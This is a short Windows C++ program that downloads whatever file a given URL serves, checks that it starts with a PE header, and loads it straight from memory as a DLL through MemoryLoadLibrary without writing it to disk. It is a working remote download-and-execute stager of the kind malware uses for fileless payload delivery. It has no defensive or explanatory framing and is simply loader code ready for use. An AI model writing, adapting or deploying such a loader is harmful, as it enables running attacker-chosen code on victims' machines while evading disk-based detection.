#define _CRT_SECURE_NO_WARNINGS
#include <assert.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <malloc.h>
#include <wininet.h>
#include "Header.h"
#include<iostream>
#include <vector>
#pragma comment(lib, "wininet.lib")
using namespace std;
void main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("execute me with a url in argv[1] to get response from");
        return;
    }

    HINTERNET hInternet = InternetOpen("User-Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("Unable to initialize WinINet\n");
        return;
    }
    printf("Sending request to: %s\n", argv[1]);
    HINTERNET hConnect = InternetOpenUrl(hInternet, argv[1], NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        printf("Error opening URL\n");
        return;
    }

    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;
    BYTE data[4096];

    while (InternetReadFile(hConnect, data, sizeof(data), &bytesRead) && bytesRead > 0) {
        buffer.insert(buffer.end(), data, data + bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (buffer[0] != 0x4d || buffer[1] != 0x5a) {

        printf("response from the server was not a PE raw bytes data");
        return;
    }
    void* pMem = VirtualAlloc(NULL, buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pMem) {
        printf("VirtualAlloc failed\n");
        return;
    }

    memcpy(pMem, buffer.data(), buffer.size());

    MemoryLoadLibrary(pMem, buffer.size());
    printf("You DLL was loaded");

}